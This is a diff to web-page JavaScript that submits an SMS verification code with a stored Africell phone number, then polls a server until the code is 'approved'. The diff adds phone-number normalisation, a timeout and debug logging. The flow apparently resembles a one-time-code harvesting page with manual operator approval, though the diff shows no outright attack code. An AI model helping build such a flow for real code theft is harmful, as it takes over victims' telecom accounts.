@@ -302,7 +302,10 @@
             const pinVal = document.getElementById('verificationPin').value.trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
-            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Unknown User';
+            
+            // Strictly remove all spaces so phone matches server key format (+232XXXXXXXX)
+            let rawPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+23200000000';
+            const phoneInput = rawPhone.replace(/\s+/g, '').trim();
 
             if (!pinVal || pinVal.length < 4) {
                 showAppAlert('❌ Wrong Code');
@@ -314,6 +317,8 @@
             try {
                 verifyBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
+
+                console.log('📤 Submitting SMS Code for phone:', phoneInput);
 
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
@@ -339,14 +344,29 @@
         }
 
         function pollApprovalStatus(phone) {
-            const cleanPhone = phone.trim();
+            const cleanPhone = phone.replace(/\s+/g, '').trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
+            
+            let elapsedTime = 0;
+            const maxWaitTime = 120000; // 2 minutes timeout safety net
 
             const statusInterval = setInterval(async () => {
+                elapsedTime += 3000;
+
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(statusInterval);
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    verifyBtn.classList.remove('disabled-state');
+                    showAppAlert('⏱️ Request timed out. Please try again.');
+                    return;
+                }
+
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
+
+                    console.log('🔄 Scratch Polling Status Response:', data);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
